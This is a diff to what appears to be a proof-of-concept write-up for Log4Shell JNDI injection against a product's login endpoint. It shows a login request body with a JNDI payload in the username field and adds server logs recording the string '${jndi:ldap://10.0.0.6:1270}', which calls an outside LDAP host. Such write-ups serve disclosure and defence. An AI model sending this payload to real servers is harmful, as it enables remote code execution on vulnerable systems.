@@ -26,4 +26,10 @@ Upgrade-Insecure-Requests: 1
 j_username=<JNDI Payload>&j_password=password&logincontext=employee
 ```
 
-I have not tested it, If anyone confirm it, Please contribute the test screenshot.
+Logs
+
+```
+2021-12-20 21:44:41,385 ERROR [LocalHostAuthenticationProvider.authenticate:76] (http-nio-127.0.0.1-8081-exec-5:[])  {pathInfo=null} Cannot find user '${jndi:ldap://10.0.0.6:1270}'
+2021-12-20 21:50:12,486 INFO  [MIUserServiceImpl.updateFailedLoginStatus:3436] (http-nio-127.0.0.1-8081-exec-5:[])  {pathInfo=null} User ${jndi:ldap://10.0.0.6:1270} failed to login attempt 1 from ipaddress 10.0.0.6
+2021-12-20 21:50:12,491 WARN  [MIUserServiceImpl.saveFailedLoginAttempts:2987] (http-nio-127.0.0.1-8081-exec-5:[])  {pathInfo=null} No User found with username ${jndi:ldap://10.0.0.6:1270}
+```
